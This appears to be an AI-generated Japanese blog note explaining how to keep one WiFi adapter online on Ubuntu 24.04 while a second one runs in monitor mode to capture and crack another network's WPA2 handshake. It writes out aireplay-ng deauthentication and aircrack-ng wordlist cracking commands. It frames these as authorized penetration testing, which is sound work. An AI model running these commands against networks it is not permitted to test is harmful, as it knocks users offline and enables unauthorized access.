---
audio: false
generated: true
image: false
lang: ja
layout: post
model: x-ai/grok-4-fast
title: セキュリティテスト用デュアルWiFiアダプター
translated: true
type: note
---

はい、Ubuntu 24.04は既知のパスワードを使用して1つのWiFiネットワークに接続（インターネットアクセス用）しながら、同時に別のWiFiネットワークのパスワードを「ハック」（クラックまたはテスト）することが可能ですが、競合を避けるために特定のハードウェアと注意深い設定が必要です。このセットアップは、自身のネットワークに対する倫理的ペネトレーションテストやセキュリティ監査で一般的です—許可されていないアクセスは違法であることに注意してください。

### 主要な要件
- **2つのWiFiアダプター**: 少なくとも2つの別々のワイヤレスインターフェース（例：組み込みのラップトップWiFiを`wlan0`として接続用、USB WiFiアダプターを`wlan1`として監視用）が必要です。単一のアダプターでは、接続（マネージドモード）とモニターモードを同時に使用できません。
  - モニターモード対応のおすすめアダプター: Intel（例：AX200/AX210）、Atheros、または互換性のあるRealtekチップセット。`iw list`で互換性を確認（サポートされているインターフェースモードで「monitor」を探す）。
- **ツール**: スキャン、ハンドシェイクキャプチャ、クラッキング用に`aircrack-ng`スイートをインストール:  
  ```
  sudo apt update && sudo apt install aircrack-ng
  ```
- **Ubuntu 24.04の詳細**: 以前のバージョンから大きな変更はありません—NetworkManagerが接続を処理しますが、モニターモードツールは適切に管理されないと干渉する可能性があります。Kernel 6.8+は最新のアダプターをよくサポートします。

### 仕組み: ステップバイステップのセットアップ
1. **既知のWiFiへの接続（マネージドモード）**:
   - NetworkManager（GUIまたはCLI）を使用して通常通り接続:  
     ```
     nmcli device wifi connect "YourKnownSSID" password "knownpassword"
     ```
   - 確認: `nmcli connection show --active`。これにより、最初のインターフェース（例：`wlan0`）でインターネットがアクティブな状態を維持します。

2. **監視用の第2アダプターをセットアップ（最初の接続を妨げずに）**:
   - インターフェースを識別: `iw dev`（例：`wlan1`がUSBアダプター）。
   - `airmon-ng`（aircrack-ng付属）の使用は避けてください。NetworkManagerを終了させ接続を妨げることが多いためです。代わりに手動の`iw`コマンドを使用:  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
     sudo ip link set wlan1 up
     ```
   - 確認: `iw dev`（`wlan1`に対して`type monitor`と表示されるはず）。

3. **パスワードクラッキングのためのスキャンとキャプチャ**:
   - ネットワークをスキャン: `sudo airodump-ng wlan1`（SSID、BSSID、チャンネルをリスト表示；Ctrl+Cで停止）。
   - 特定のネットワークをターゲット（例：BSSID `AA:BB:CC:DD:EE:FF`、チャンネル6）:  
     ```
     sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan1
     ```
     これによりパケットを`capture-01.cap`にキャプチャします。WPA2クラッキングでは、4ウェイハンドシェイクを待つ（または倫理的にdeauthで強制: `sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1`）。
   - オフラインでクラック: `sudo aircrack-ng -w /path/to/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`。

4. **通常動作への復帰**:
   - 監視を停止:  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type managed
     sudo ip link set wlan1 up
     ```
   - 必要に応じて再接続: NetworkManagerを再起動（`sudo systemctl restart NetworkManager`）または`nmcli`を使用。

### 潜在的な問題と修正
- **接続切断**: 最初のWiFiが切断された場合（手動メソッドでは稀）、DHCPを更新: `sudo dhclient -r wlan0 && sudo dhclient wlan0`。
- **干渉**: 監視インターフェースでのみ競合プロセスを終了: `sudo airmon-ng check kill`（ただしこれは全てに影響するため注意して使用）。
- **USBアダプターの安定性**: 安価なアダプターはモニターモードでドロップすることがあります；`iwconfig`または`iw dev`でテスト。
- **有線代替案**: 第2のWiFiがない場合、インターネット接続にイーサネットを使用し、単一のWiFiアダプターで監視（より簡単、NetworkManagerを終了させても有線に影響なし）。

このセットアップは、テスト目的でUbuntu 24.04上で確実に動作します。ネットワークをテストする前には常に許可を取得してください。

### 参考文献
- [How to enable WiFi while using two wireless cards one in monitor mode](https://security.stackexchange.com/questions/121215/how-to-enable-wifi-while-using-two-wireless-cards-one-in-monitor-mode-and-other)  
- [Wireless Packet Capture using Ubuntu 24 LTS](https://www.reddit.com/r/RGNets/comments/1l4672v/wireless_packet_capture_using_ubuntu_24_lts/)  
- [Aircrack-ng Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)